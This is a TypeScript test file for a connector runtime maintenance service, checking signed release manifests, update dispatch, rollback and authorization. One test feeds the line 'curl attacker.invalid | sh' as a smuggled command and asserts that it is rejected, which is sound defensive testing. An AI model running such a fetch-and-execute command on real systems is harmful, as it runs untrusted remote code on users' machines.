import { generateKeyPairSync, sign } from 'node:crypto';

import { describe, expect, test } from 'bun:test';

import {
  ConnectorRuntimeMaintenanceService,
  connectorRuntimeBridgeReleaseForMachine
} from '../server/connector-runtime-maintenance-service';
import {
  MemoryConnectorRuntimeOperationStore,
  type ConnectorRuntimeAuditInput,
  type CreateConnectorRuntimeOperationInput
} from '../server/connector-runtime-operation-store';
import {
  canonicalConnectorRuntimeReleaseManifest,
  connectorRuntimeReleaseManifestSchema,
  type ConnectorRuntimeReleaseManifest
} from '../server/connector-runtime-release-manifest';
import type { MachineRecord } from '../src/shared/project-space-api';

const now = new Date('2026-07-14T00:00:00.000Z');
const keys = generateKeyPairSync('ed25519');
const capabilities = ['runtime.restart', 'runtime.update', 'worktrees.list.v2'];

function manifest(): ConnectorRuntimeReleaseManifest {
  return {
    artifacts: [{
      assetName: 'project-space-machine-tools-darwin-arm64-v0.5.0.tar.gz',
      bundleVersions: { connector: '0.5.0', machineTools: '0.5.0', projectCli: '0.5.0' },
      capabilities,
      downloadUrl:
        'https://github.com/DotNaos/project-space/releases/download/v0.5.0/project-space-machine-tools-darwin-arm64-v0.5.0.tar.gz',
      protocolVersion: '2',
      sha256: 'a'.repeat(64),
      sizeBytes: 4,
      target: 'darwin-arm64'
    }],
    buildId: '1'.repeat(40),
    channel: 'stable',
    expiresAt: '2027-07-14T00:00:00.000Z',
    issuedAt: '2026-07-13T00:00:00.000Z',
    releaseId: 'v0.5.0',
    schema: connectorRuntimeReleaseManifestSchema,
    source: 'managed',
    version: '0.5.0'
  };
}

function versionedManifest(version: string, build = '2') {
  const value = structuredClone(manifest());
  value.version = version;
  value.releaseId = `v${version}`;
  value.buildId = build.repeat(40);
  const artifact = value.artifacts[0]!;
  artifact.assetName = `project-space-machine-tools-darwin-arm64-v${version}.tar.gz`;
  artifact.bundleVersions = {
    connector: version, machineTools: version, projectCli: version
  };
  artifact.downloadUrl =
    `https://github.com/DotNaos/project-space/releases/download/v${version}/${artifact.assetName}`;
  return value;
}

function signedManifest(value: ConnectorRuntimeReleaseManifest = manifest()) {
  return {
    manifest: value,
    signature: sign(
      null,
      Buffer.from(canonicalConnectorRuntimeReleaseManifest(value), 'utf8'),
      keys.privateKey
    ).toString('base64url')
  };
}

function currentMachine(overrides: Partial<MachineRecord> = {}): MachineRecord {
  return {
    connector: {
      capabilities,
      installCommand: 'project-space-connector',
      runtime: {
        architecture: 'arm64',
        buildId: '0'.repeat(40),
        bundleVersions: {
          connector: '0.4.0', machineTools: '0.4.0', projectCli: '0.4.0'
        },
        channel: 'stable',
        instanceId: 'instance-before',
        lastCheckedAt: now.toISOString(),
        platform: 'darwin',
        protocolVersion: '2',
        releaseId: 'v0.4.0',
        source: 'managed',
        version: '0.4.0'
      },
      status: 'online'
    },
    id: 'machine-1',
    kind: 'connector',
    name: 'Machine',
    network: {},
    roles: ['connector'],
    sourcePath: 'connector-hub',
    ...overrides
  };
}

class Harness {
  approvedManifest = manifest();
  automaticUpdateAllowed = true;
  automaticUpdateOwners: Array<string | undefined> = [];
  currentNow = new Date(now);
  machine: MachineRecord | null = currentMachine();
  role: 'member' | 'owner' | null = 'owner';
  releaseCalls = 0;
  dispatches: Array<Parameters<ConstructorParameters<
    typeof ConnectorRuntimeMaintenanceService
  >[0]['dispatcher']['dispatch']>[0]> = [];
  dispatchError?: Error;
  historicalManifests = new Map<string, ConnectorRuntimeReleaseManifest>();
  releaseErrorById = new Map<string, Error>();
  readonly operations = new CapturingConnectorRuntimeOperationStore();

  service() {
    return new ConnectorRuntimeMaintenanceService({
      directory: {
        canAutomaticallyUpdate: async (_machineId, ownerUserId) => {
          this.automaticUpdateOwners.push(ownerUserId);
          return this.automaticUpdateAllowed;
        },
        readMachine: async () => this.machine,
        readMembership: async () => this.role ? { role: this.role } : null
      },
      dispatcher: {
        dispatch: async (input) => {
          this.dispatches.push(input);
          input.onProgress('validating');
          if (input.plan.operation === 'update') {
            input.onProgress('staging');
            input.onProgress('verifying');
          }
          if (this.dispatchError) throw this.dispatchError;
          input.onProgress('accepted');
        }
      },
      manifestPublicKey: keys.publicKey,
      now: () => new Date(this.currentNow),
      operations: this.operations,
      rateLimiter: { consume: async () => ({ allowed: true }) },
      releases: {
        loadApprovedManifest: async (releaseId) => {
          this.releaseCalls += 1;
          if (releaseId && this.releaseErrorById.has(releaseId)) {
            throw this.releaseErrorById.get(releaseId)!;
          }
          const selected = !releaseId || releaseId === this.approvedManifest.releaseId
            ? this.approvedManifest
            : this.historicalManifests.get(releaseId);
          if (!selected) throw new Error('release unavailable');
          return signedManifest(selected);
        }
      }
    });
  }
}

class CapturingConnectorRuntimeOperationStore extends MemoryConnectorRuntimeOperationStore {
  blockNextSucceededTransition = false;
  readonly createInputs: CreateConnectorRuntimeOperationInput[] = [];

  override async createAccepted(
    input: CreateConnectorRuntimeOperationInput,
    audit: ConnectorRuntimeAuditInput,
    acceptedAt: string
  ) {
    this.createInputs.push(structuredClone(input));
    return await super.createAccepted(input, audit, acceptedAt);
  }

  override async transition(
    input: Parameters<MemoryConnectorRuntimeOperationStore['transition']>[0]
  ) {
    if (this.blockNextSucceededTransition && input.state === 'succeeded') {
      this.blockNextSucceededTransition = false;
      return null;
    }
    return super.transition(input);
  }
}

async function settleDispatch() {
  await new Promise((resolve) => setTimeout(resolve, 0));
}

describe('connector runtime maintenance service', () => {
  test('routes only pre-bootstrap managed Linux runtimes through v0.4.14', () => {
    const linux = currentMachine();
    linux.connector.runtime = {
      ...linux.connector.runtime!,
      architecture: 'x64',
      platform: 'linux',
      releaseId: 'v0.4.13',
      version: '0.4.13'
    };
    expect(connectorRuntimeBridgeReleaseForMachine(linux)).toBe('v0.4.14');
    linux.connector.runtime.version = '0.4.14';
    linux.connector.runtime.releaseId = 'v0.4.14';
    expect(connectorRuntimeBridgeReleaseForMachine(linux)).toBeUndefined();
    linux.connector.runtime.platform = 'darwin';
    expect(connectorRuntimeBridgeReleaseForMachine(linux)).toBeUndefined();
  });

  test('persists an automatic update before dispatching it on a stale reconnect', async () => {
    const harness = new Harness();
    const service = harness.service();

    expect(await service.decideReconnect(harness.machine!)).toBeUndefined();
    expect(harness.dispatches).toHaveLength(0);
    expect(await harness.operations.latest('machine-1')).toMatchObject({
      expectedReleaseId: 'v0.5.0',
      operation: 'update',
      requestedByUserId: 'system:connector-auto-update',
      state: 'queued'
    });
    expect((await service.status('machine-1')).update.state).toBe('update-pending');

    await service.continueMaintenance(harness.machine!);
    expect(harness.dispatches).toHaveLength(1);
    expect(harness.dispatches[0]?.plan).toMatchObject({
      operation: 'update', releaseId: 'v0.5.0'
    });
    await settleDispatch();
    expect((await harness.operations.latest('machine-1'))?.state).toBe('reconnecting');
  });

  test('does not auto-select a connector when physical identity is ambiguous', async () => {
    const harness = new Harness();
    harness.automaticUpdateAllowed = false;
    const service = harness.service();

    await service.prepareReconnect(harness.machine!, 'owner-1');
    await service.continueMaintenance(harness.machine!);
    expect(await harness.operations.latest('machine-1')).toMatchObject({
      lastFailure: { code: 'ambiguous-physical-machine' },
      state: 'queued'
    });
    expect(harness.dispatches).toHaveLength(0);
  });

  test('keeps a busy automatic update queued and retries it after the machine is idle', async () => {
    const harness = new Harness();
    const service = harness.service();
    harness.dispatchError = Object.assign(new Error('busy'), { code: 'busy' });

    await service.decideReconnect(harness.machine!);
    await service.continueMaintenance(harness.machine!);
    await settleDispatch();
    expect(await harness.operations.latest('machine-1')).toMatchObject({
      lastFailure: {
        code: 'busy',
        message: 'Update deferred until Codex work and machine changes are finished.'
      },
      state: 'queued'
    });

    harness.dispatchError = undefined;
    await service.continueMaintenance(harness.machine!);
    await settleDispatch();
    expect(harness.dispatches).toHaveLength(2);
    expect((await harness.operations.latest('machine-1'))?.state).toBe('reconnecting');
  });

  test('persists concrete deferral reasons and requeues pre-send unavailability', async () => {
    for (const [code, message] of [
      ['codex-waiting-approval', 'waiting for approval'],
      ['unavailable', 'connector is available again']
    ] as const) {
      const harness = new Harness();
      harness.dispatchError = Object.assign(new Error(code), { code });
      const service = harness.service();
      await service.prepareReconnect(harness.machine!, 'owner-1');
      await service.continueMaintenance(harness.machine!, 'owner-1');
      await settleDispatch();
      expect(await harness.operations.latest('machine-1')).toMatchObject({
        lastFailure: { code }, state: 'queued'
      });
      expect((await harness.operations.latest('machine-1'))?.lastFailure?.message)
        .toContain(message);
    }
  });

  test('keeps an unknown post-send outcome reconcilable until its deadline', async () => {
    const harness = new Harness();
    harness.dispatchError = Object.assign(new Error('unknown'), { code: 'outcome-unknown' });
    const service = harness.service();
    await service.prepareReconnect(harness.machine!, 'owner-1');
    await service.continueMaintenance(harness.machine!, 'owner-1');
    await settleDispatch();
    expect(await harness.operations.latest('machine-1')).toMatchObject({
      lastFailure: { code: 'outcome-unknown', rollbackAvailable: true },
      state: 'reconnecting'
    });

    harness.currentNow = new Date(now.getTime() + 11 * 60_000);
    await service.continueMaintenance(harness.machine!, 'owner-1');
    expect(await harness.operations.latest('machine-1')).toMatchObject({
      lastFailure: { code: 'reconnect-timeout' }, state: 'recovery-required'
    });
  });

  test('fails closed when a dispatched update reconnects without maintenance evidence', async () => {
    const harness = new Harness();
    const service = harness.service();
    await service.prepareReconnect(harness.machine!, 'owner-1');
    await service.continueMaintenance(harness.machine!, 'owner-1');
    await settleDispatch();
    expect((await harness.operations.latest('machine-1'))?.state).toBe('reconnecting');

    const reconnected = structuredClone(harness.machine!);
    reconnected.connector.runtime!.instanceId = 'instance-without-evidence';
    const restartedService = harness.service();
    await restartedService.prepareReconnect(reconnected, 'owner-1');
    expect(await harness.operations.latest('machine-1')).toMatchObject({
      lastFailure: { code: 'maintenance-evidence-missing' },
      state: 'recovery-required'
    });
  });

  test('keeps old-instance staging and pre-shutdown heartbeats active', async () => {
    const staging = new Harness();
    const stagingService = staging.service();
    await stagingService.prepareReconnect(staging.machine!, 'owner-1');
    const queued = await staging.operations.latest('machine-1');
    await staging.operations.transition({
      expectedStates: ['queued'], id: queued!.id, startedAt: now.toISOString(),
      state: 'staging', updatedAt: now.toISOString()
    });
    await stagingService.prepareReconnect(staging.machine!, 'owner-1');
    expect((await staging.operations.latest('machine-1'))?.state).toBe('staging');

    const accepted = new Harness();
    const acceptedService = accepted.service();
    await acceptedService.prepareReconnect(accepted.machine!, 'owner-1');
    await acceptedService.continueMaintenance(accepted.machine!, 'owner-1');
    await settleDispatch();
    expect((await accepted.operations.latest('machine-1'))?.state).toBe('reconnecting');
    await accepted.service().prepareReconnect(accepted.machine!, 'owner-1');
    expect((await accepted.operations.latest('machine-1'))?.state).toBe('reconnecting');
  });

  test('keeps the physical owner scope through the dispatch-adjacent canonical check', async () => {
    const harness = new Harness();
    const service = harness.service();
    await service.prepareReconnect(harness.machine!, 'owner-1');
    await service.continueMaintenance(harness.machine!, 'owner-1');
    expect(harness.automaticUpdateOwners.length).toBeGreaterThanOrEqual(3);
    expect(harness.automaticUpdateOwners.every((owner) => owner === 'owner-1')).toBe(true);
  });

  test('coalesces a queued reconnect update to the newest approved release', async () => {
    const harness = new Harness();
    const service = harness.service();
    await service.decideReconnect(harness.machine!);

    const newest = structuredClone(manifest());
    newest.version = '0.6.0';
    newest.releaseId = 'v0.6.0';
    newest.buildId = '2'.repeat(40);
    newest.artifacts[0]!.assetName =
      'project-space-machine-tools-darwin-arm64-v0.6.0.tar.gz';
    newest.artifacts[0]!.bundleVersions = {
      connector: '0.6.0', machineTools: '0.6.0', projectCli: '0.6.0'
    };
    newest.artifacts[0]!.downloadUrl =
      'https://github.com/DotNaos/project-space/releases/download/v0.6.0/project-space-machine-tools-darwin-arm64-v0.6.0.tar.gz';
    harness.approvedManifest = newest;

    await service.continueMaintenance(harness.machine!);
    expect(harness.dispatches[0]?.plan).toMatchObject({
      operation: 'update', releaseId: 'v0.6.0'
    });
    expect(await harness.operations.latest('machine-1')).toMatchObject({
      expectedBuildId: '2'.repeat(40),
      expectedReleaseId: 'v0.6.0'
    });
  });

  test('never coalesces backward and dispatches the persisted newest signed release', async () => {
    const harness = new Harness();
    harness.approvedManifest = versionedManifest('0.6.0');
    const service = harness.service();
    await service.prepareReconnect(harness.machine!, 'owner-1');
    harness.historicalManifests.set('v0.6.0', harness.approvedManifest);
    harness.approvedManifest = manifest();

    await service.continueMaintenance(harness.machine!, 'owner-1');
    expect(harness.dispatches).toHaveLength(1);
    expect(harness.dispatches[0]?.plan).toMatchObject({
      operation: 'update', releaseId: 'v0.6.0'
    });
    expect(await harness.operations.latest('machine-1')).toMatchObject({
      expectedReleaseId: 'v0.6.0', state: 'validating'
    });
  });

  test('preserves a queued target when its signed release source is temporarily unavailable', async () => {
    const harness = new Harness();
    harness.approvedManifest = versionedManifest('0.6.0');
    const service = harness.service();
    await service.prepareReconnect(harness.machine!, 'owner-1');
    harness.approvedManifest = manifest();
    harness.releaseErrorById.set('v0.6.0', new Error('temporary source outage'));

    await service.continueMaintenance(harness.machine!, 'owner-1');
    expect(harness.dispatches).toHaveLength(0);
    expect(await harness.operations.latest('machine-1')).toMatchObject({
      expectedReleaseId: 'v0.6.0',
      lastFailure: { code: 'unavailable' },
      state: 'queued'
    });
  });

  test('treats extra normal connector capabilities as compatible with the signed runtime', async () => {
    const harness = new Harness();
    harness.machine = currentMachine({ connector: {
      ...currentMachine().connector,
      capabilities: [...capabilities, 'workspace.inspect.v2'],
      runtime: {
        ...currentMachine().connector.runtime!,
        buildId: manifest().buildId,
        bundleVersions: manifest().artifacts[0]!.bundleVersions,
        releaseId: manifest().releaseId,
        version: manifest().version
      }
    } });
    await harness.service().prepareReconnect(harness.machine, 'owner-1');
    expect(await harness.operations.latest('machine-1')).toBeNull();
    expect(harness.dispatches).toHaveLength(0);
  });

  test('authorizes an exact update and persists reconnect expectations before dispatch', async () => {
    const harness = new Harness();
    const result = await harness.service().request(
      { machineId: 'machine-1', operation: 'update', releaseId: 'v0.5.0' },
      'owner-1'
    );
    expect(result.operation).toMatchObject({
      expectedBuildId: '1'.repeat(40),
      expectedReleaseId: 'v0.5.0',
      machineId: 'machine-1',
      operation: 'update',
      previousInstanceId: 'instance-before',
      state: 'queued'
    });
    expect(harness.dispatches[0]?.plan).toMatchObject({
      machineId: 'machine-1', operation: 'update', releaseId: 'v0.5.0'
    });
    expect(JSON.stringify(result)).not.toContain('downloadUrl');
    expect(JSON.stringify(result)).not.toContain('signature');
    await settleDispatch();
    expect((await harness.operations.latest('machine-1'))?.state).toBe('reconnecting');
  });

  test('persists the resolved release identity for a default update', async () => {
    const harness = new Harness();
    await harness.service().request(
      { machineId: 'machine-1', operation: 'update' },
      'owner-1'
    );

    expect(harness.operations.createInputs[0]?.requestedReleaseId).toBe('v0.5.0');
  });

  test('keeps restart independent and available while already current', async () => {
    const harness = new Harness();
    harness.machine = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        buildId: manifest().buildId,
        releaseId: manifest().releaseId,
        version: manifest().version
      }
    } });
    const result = await harness.service().request(
      { machineId: 'machine-1', operation: 'restart' }, 'owner-1'
    );
    expect(result.operation.operation).toBe('restart');
    expect(harness.releaseCalls).toBe(0);
    expect(harness.operations.createInputs[0]?.requestedReleaseId).toBeUndefined();
    expect(harness.dispatches[0]?.plan.operation).toBe('restart');
  });

  test('rejects a signed approved release older than the installed runtime', async () => {
    const harness = new Harness();
    harness.machine = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        buildId: '2'.repeat(40),
        bundleVersions: {
          connector: '0.6.0', machineTools: '0.6.0', projectCli: '0.6.0'
        },
        releaseId: 'v0.6.0',
        version: '0.6.0'
      }
    } });

    await expect(harness.service().request(
      { machineId: 'machine-1', operation: 'update', releaseId: 'v0.5.0' },
      'owner-1'
    )).rejects.toMatchObject({ code: 'release-downgrade' });
    expect(harness.releaseCalls).toBe(1);
    expect(harness.dispatches).toHaveLength(0);
    expect(await harness.operations.latest('machine-1')).toBeNull();
    expect(harness.operations.audits.at(-1)).toMatchObject({
      outcome: 'rejected', reason: 'release-downgrade'
    });
  });

  test('rejects arbitrary input, non-owners, offline and unsupported old connectors', async () => {
    const arbitrary = new Harness();
    await expect(arbitrary.service().request({
      command: 'curl attacker.invalid | sh', machineId: 'machine-1', operation: 'update'
    }, 'owner-1')).rejects.toMatchObject({ code: 'invalid-request' });
    expect(arbitrary.dispatches).toHaveLength(0);
    expect(arbitrary.operations.audits[0]).toMatchObject({
      outcome: 'rejected', reason: 'invalid-request'
    });
    expect(arbitrary.operations.audits[0]).not.toHaveProperty('machineId');

    const member = new Harness();
    member.role = 'member';
    await expect(member.service().request(
      { machineId: 'machine-1', operation: 'restart' }, 'member-1'
    )).rejects.toMatchObject({ code: 'unauthorized' });

    const offline = new Harness();
    offline.machine = currentMachine({ connector: {
      ...currentMachine().connector, status: 'offline'
    } });
    await expect(offline.service().request(
      { machineId: 'machine-1', operation: 'restart' }, 'owner-1'
    )).rejects.toMatchObject({ code: 'offline' });

    const legacy = new Harness();
    legacy.machine = currentMachine({ connector: {
      capabilities: [], installCommand: 'legacy', status: 'online'
    } });
    await expect(legacy.service().request(
      { machineId: 'machine-1', operation: 'update' }, 'owner-1'
    )).rejects.toMatchObject({ code: 'unsupported-operation' });
  });

  test('persists dispatch failure and atomically refuses a conflicting operation', async () => {
    const failed = new Harness();
    failed.dispatchError = new Error('socket closed');
    await failed.service().request(
      { machineId: 'machine-1', operation: 'restart' }, 'owner-1'
    );
    await settleDispatch();
    expect(await failed.operations.latest('machine-1')).toMatchObject({
      lastFailure: { code: 'internal-error' }, state: 'failed'
    });

    const conflict = new Harness();
    await conflict.service().request(
      { machineId: 'machine-1', operation: 'restart' }, 'owner-1'
    );
    await expect(conflict.service().request(
      { machineId: 'machine-1', operation: 'restart' }, 'owner-1'
    )).rejects.toMatchObject({ code: 'operation-conflict' });
  });

  test('expires a stale operation before accepting a retry without a status poll', async () => {
    const harness = new Harness();
    const first = await harness.service().request(
      { machineId: 'machine-1', operation: 'restart' }, 'owner-1'
    );
    await settleDispatch();
    harness.currentNow = new Date(now.getTime() + 3 * 60_000);

    const retry = await harness.service().request(
      { machineId: 'machine-1', operation: 'restart' }, 'owner-1'
    );

    expect(retry.operation.id).not.toBe(first.operation.id);
    const active = await harness.operations.listActive();
    expect(active).toHaveLength(1);
    expect(active[0]?.id).toBe(retry.operation.id);
    expect(harness.operations.audits.map((audit) => audit.outcome)).toEqual([
      'accepted', 'accepted'
    ]);
  });

  test('commits only after an exact reconnect acknowledges the persisted decision', async () => {
    const success = new Harness();
    const started = await success.service().request(
      { machineId: 'machine-1', operation: 'update' }, 'owner-1'
    );
    await settleDispatch();
    const updated = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        buildId: manifest().buildId,
        bundleVersions: manifest().artifacts[0]!.bundleVersions,
        instanceId: 'instance-after',
        maintenance: { operationId: started.operation.id, state: 'pending-health-check' },
        releaseId: manifest().releaseId,
        version: manifest().version
      }
    } });
    expect(await success.service().decideReconnect(updated)).toEqual({
      action: 'commit', operationId: started.operation.id
    });
    expect((await success.operations.latest('machine-1'))?.state).toBe('succeeded');
    expect(await success.service().decideReconnect(updated)).toEqual({
      action: 'commit', operationId: started.operation.id
    });
    expect((await success.operations.latest('machine-1'))?.state).toBe('succeeded');

    const rolledBack = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        instanceId: 'instance-rollback',
        maintenance: { operationId: started.operation.id, state: 'rolled-back' }
      }
    } });
    const corruptRollback = structuredClone(rolledBack);
    corruptRollback.connector.runtime!.buildId = 'f'.repeat(40);
    expect(await success.service().decideReconnect(corruptRollback)).toBeUndefined();
    const pinnedRollback = structuredClone(rolledBack);
    pinnedRollback.connector.runtime!.instanceId = 'instance-before';
    expect(await success.service().decideReconnect(pinnedRollback)).toBeUndefined();
    const expandedRollback = structuredClone(rolledBack);
    expandedRollback.connector.capabilities = [...capabilities, 'runtime.untrusted'];
    expect(await success.service().decideReconnect(expandedRollback)).toBeUndefined();
    expect((await success.operations.latest('machine-1'))?.state).toBe('succeeded');

    expect(await success.service().decideReconnect(rolledBack)).toEqual({
      action: 'rollback', operationId: started.operation.id
    });
    expect(await success.operations.latest('machine-1')).toMatchObject({
      lastFailure: { code: 'supervisor-rollback-after-commit' },
      state: 'rolled-back'
    });
    expect(await success.service().decideReconnect(corruptRollback)).toBeUndefined();
    expect(await success.service().decideReconnect(rolledBack)).toEqual({
      action: 'rollback', operationId: started.operation.id
    });
  });

  test('returns a reconnect decision only after a successful fresh state comparison', async () => {
    const harness = new Harness();
    const service = harness.service();
    const started = await service.request(
      { machineId: 'machine-1', operation: 'update' }, 'owner-1'
    );
    await settleDispatch();
    const updated = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        buildId: manifest().buildId,
        bundleVersions: manifest().artifacts[0]!.bundleVersions,
        instanceId: 'instance-after',
        maintenance: { operationId: started.operation.id, state: 'pending-health-check' },
        releaseId: manifest().releaseId,
        version: manifest().version
      }
    } });
    harness.operations.blockNextSucceededTransition = true;
    expect(await service.decideReconnect(updated)).toBeUndefined();
    expect((await harness.operations.latest('machine-1'))?.state).toBe('reconnecting');
    expect(await service.decideReconnect(updated)).toEqual({
      action: 'commit', operationId: started.operation.id
    });
  });

  test('never reuses a succeeded decision for a later stale reconnect fingerprint', async () => {
    const harness = new Harness();
    const service = harness.service();
    const started = await service.request(
      { machineId: 'machine-1', operation: 'update' }, 'owner-1'
    );
    await settleDispatch();
    const healthy = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        buildId: manifest().buildId,
        bundleVersions: manifest().artifacts[0]!.bundleVersions,
        instanceId: 'instance-after',
        maintenance: { operationId: started.operation.id, state: 'pending-health-check' },
        releaseId: manifest().releaseId,
        version: manifest().version
      }
    } });
    expect(await service.decideReconnect(healthy)).toMatchObject({ action: 'commit' });
    const stale = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        instanceId: 'instance-stale',
        maintenance: { operationId: started.operation.id, state: 'pending-health-check' }
      }
    } });
    expect(await service.decideReconnect(stale)).toEqual({
      action: 'rollback', operationId: started.operation.id
    });
    expect(await harness.operations.latest('machine-1')).toMatchObject({
      lastFailure: { code: 'wrong-reconnect-version' }, state: 'rolling-back'
    });
  });

  test('commits an exact signed update when the supervisor preserves its instance id', async () => {
    const stableInstance = new Harness();
    const started = await stableInstance.service().request(
      { machineId: 'machine-1', operation: 'update' }, 'owner-1'
    );
    await settleDispatch();
    const updated = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        buildId: manifest().buildId,
        bundleVersions: manifest().artifacts[0]!.bundleVersions,
        maintenance: { operationId: started.operation.id, state: 'pending-health-check' },
        releaseId: manifest().releaseId,
        version: manifest().version
      }
    } });

    expect(await stableInstance.service().decideReconnect(updated)).toEqual({
      action: 'commit', operationId: started.operation.id
    });
    expect((await stableInstance.operations.latest('machine-1'))?.state)
      .toBe('succeeded');
  });

  test('repairs same-release Codex drift once and accepts unchanged connector identity', async () => {
    const configureDrift = (harness: Harness) => {
      harness.approvedManifest.artifacts[0]!.capabilities = [
        ...capabilities, 'codex.runtime.v1', 'codex.runtime.version.0.145.0'
      ].sort();
      harness.machine = currentMachine({ connector: {
        ...currentMachine().connector,
        capabilities: [
          ...harness.approvedManifest.artifacts[0]!.capabilities,
          'codex.machine-tasks.v1',
          'codex.sessions.model-selection.v1',
          'codex.sessions.model-settings.v1'
        ],
        daemon: {
          appServerVersion: '0.145.0', authenticated: true, backend: 'socket',
          checkedAt: now.toISOString(), cliVersion: '0.145.0', compatible: true,
          installed: true, managedCodexVersion: '0.145.0', paired: false,
          reachable: true, remoteControlEnabled: false, remoteControlState: 'disabled',
          running: true, state: 'ready'
        },
        runtime: {
          ...currentMachine().connector.runtime!,
          buildId: harness.approvedManifest.buildId,
          bundleVersions: harness.approvedManifest.artifacts[0]!.bundleVersions,
          releaseId: harness.approvedManifest.releaseId,
          version: harness.approvedManifest.version
        }
      } });
    };
    const exactDaemon = {
      ...currentMachine().connector.daemon,
      appServerVersion: '0.145.0', authenticated: true, backend: 'pid',
      checkedAt: now.toISOString(), cliVersion: '0.145.0', compatible: true,
      installed: true, managedCodexVersion: '0.145.0', paired: false,
      reachable: true, remoteControlEnabled: false, remoteControlState: 'disabled' as const,
      running: true, state: 'ready' as const
    };

    const repaired = new Harness();
    configureDrift(repaired);
    const service = repaired.service();
    await service.prepareReconnect(repaired.machine!, 'owner-1');
    await service.continueMaintenance(repaired.machine!, 'owner-1');
    await settleDispatch();
    const operation = await repaired.operations.latest('machine-1');
    expect(operation).toMatchObject({ expectedReleaseId: 'v0.5.0', state: 'reconnecting' });
    const healthy = structuredClone(repaired.machine!);
    healthy.connector.daemon = exactDaemon;
    healthy.connector.runtime!.maintenance = {
      operationId: operation!.id, state: 'pending-health-check'
    };
    expect(await service.decideReconnect(healthy)).toEqual({
      action: 'commit', operationId: operation!.id
    });
    expect((await repaired.operations.latest('machine-1'))?.state).toBe('succeeded');

    const failed = new Harness();
    configureDrift(failed);
    failed.dispatchError = Object.assign(new Error('download failed'), {
      code: 'download-failed'
    });
    const failedService = failed.service();
    await failedService.prepareReconnect(failed.machine!, 'owner-1');
    await failedService.continueMaintenance(failed.machine!, 'owner-1');
    await settleDispatch();
    expect((await failed.operations.latest('machine-1'))?.state).toBe('failed');
    await failedService.continueMaintenance(failed.machine!, 'owner-1');
    expect(failed.dispatches).toHaveLength(1);
  });

  test('commits a version-pinned Codex bundle only after exact daemon and model readiness', async () => {
    const prepare = async (harness: Harness) => {
      harness.approvedManifest.artifacts[0]!.capabilities = [
        ...capabilities,
        'codex.runtime.v1',
        'codex.runtime.version.0.145.0'
      ].sort();
      const started = await harness.service().request(
        { machineId: 'machine-1', operation: 'update' }, 'owner-1'
      );
      await settleDispatch();
      return started;
    };
    const reconnected = (
      started: Awaited<ReturnType<typeof prepare>>,
      daemon: NonNullable<MachineRecord['connector']['daemon']>
    ) => currentMachine({ connector: {
      ...currentMachine().connector,
      capabilities: [
        ...capabilities,
        'codex.machine-tasks.v1',
        'codex.runtime.v1',
        'codex.runtime.version.0.145.0',
        'codex.sessions.model-selection.v1',
        'codex.sessions.model-settings.v1'
      ],
      daemon,
      runtime: {
        ...currentMachine().connector.runtime!,
        buildId: manifest().buildId,
        bundleVersions: manifest().artifacts[0]!.bundleVersions,
        instanceId: 'instance-after',
        maintenance: {
          operationId: started.operation.id,
          state: 'pending-health-check'
        },
        releaseId: manifest().releaseId,
        version: manifest().version
      }
    } });
    const exactDaemon = {
      appServerVersion: '0.145.0',
      authenticated: true,
      backend: 'pid',
      checkedAt: now.toISOString(),
      cliVersion: '0.145.0',
      compatible: true,
      installed: true,
      managedCodexVersion: '0.145.0',
      paired: false,
      reachable: true,
      remoteControlEnabled: false,
      remoteControlState: 'disabled' as const,
      running: true,
      state: 'ready' as const
    };

    const wrong = new Harness();
    const wrongStart = await prepare(wrong);
    expect(await wrong.service().decideReconnect(reconnected(wrongStart, {
      ...exactDaemon,
      backend: 'socket'
    }))).toEqual({ action: 'rollback', operationId: wrongStart.operation.id });
    expect(await wrong.operations.latest('machine-1')).toMatchObject({
      lastFailure: { code: 'codex-runtime-not-ready' },
      state: 'rolling-back'
    });

    const healthy = new Harness();
    const healthyStart = await prepare(healthy);
    expect(await healthy.service().decideReconnect(reconnected(healthyStart, exactDaemon)))
      .toEqual({ action: 'commit', operationId: healthyStart.operation.id });
    expect((await healthy.operations.latest('machine-1'))?.state).toBe('succeeded');
  });

  test('orders rollback for wrong reconnect evidence', async () => {
    const wrong = new Harness();
    const wrongStarted = await wrong.service().request(
      { machineId: 'machine-1', operation: 'update' }, 'owner-1'
    );
    await settleDispatch();
    const wrongRuntime = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        instanceId: 'instance-after',
        maintenance: {
          operationId: wrongStarted.operation.id, state: 'pending-health-check'
        }
      }
    } });
    expect(await wrong.service().decideReconnect(wrongRuntime)).toEqual({
      action: 'rollback', operationId: wrongStarted.operation.id
    });
    expect(await wrong.operations.latest('machine-1')).toMatchObject({
      lastFailure: { code: 'wrong-reconnect-version', rollbackAvailable: true },
      state: 'rolling-back'
    });

    const rolledBackMachine = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        instanceId: 'instance-rollback',
        maintenance: { operationId: wrongStarted.operation.id, state: 'rolled-back' }
      }
    } });
    const wrongRollback = structuredClone(rolledBackMachine);
    wrongRollback.connector.runtime!.releaseId = 'v0.3.0';
    expect(await wrong.service().decideReconnect(wrongRollback)).toBeUndefined();
    const pinnedRollback = structuredClone(rolledBackMachine);
    pinnedRollback.connector.runtime!.instanceId = 'instance-before';
    expect(await wrong.service().decideReconnect(pinnedRollback)).toBeUndefined();
    const expandedRollback = structuredClone(rolledBackMachine);
    expandedRollback.connector.capabilities = [...capabilities, 'runtime.untrusted'];
    expect(await wrong.service().decideReconnect(expandedRollback)).toBeUndefined();
    expect((await wrong.operations.latest('machine-1'))?.state).toBe('rolling-back');

    expect(await wrong.service().decideReconnect(rolledBackMachine)).toEqual({
      action: 'rollback', operationId: wrongStarted.operation.id
    });
    expect((await wrong.operations.latest('machine-1'))?.state).toBe('rolled-back');
  });

  test('acknowledges only an exact restored runtime after a terminal health timeout', async () => {
    const timedOut = new Harness();
    const started = await timedOut.service().request(
      { machineId: 'machine-1', operation: 'update' }, 'owner-1'
    );
